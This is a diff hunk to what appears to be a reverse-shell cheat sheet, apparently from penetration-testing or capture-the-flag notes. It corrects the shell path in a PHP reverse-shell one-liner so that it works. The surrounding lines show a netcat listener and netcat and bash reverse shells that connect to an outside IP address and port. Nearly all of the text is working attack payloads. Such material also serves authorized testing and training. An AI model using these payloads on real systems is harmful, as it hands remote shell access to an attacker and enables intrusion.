@@ -99,7 +99,7 @@ nc -lnvp 4000
 nc -e /bin/sh 10.10.15.22 4000
 ```
 #### PHP:
-```<?php $sock = fsockopen("ip","port");$proc = proc_open("bin/sh -i", array(0=>$sock,1=>$sock,2=>$sock),$pipes);?>```
+```<?php $sock = fsockopen("ip","port");$proc = proc_open("/bin/sh -i", array(0=>$sock,1=>$sock,2=>$sock),$pipes);?>```
 #### Bash
 ```bash
 bash -i >& /dev/tcp/10.10.15.22/4000 0>&1
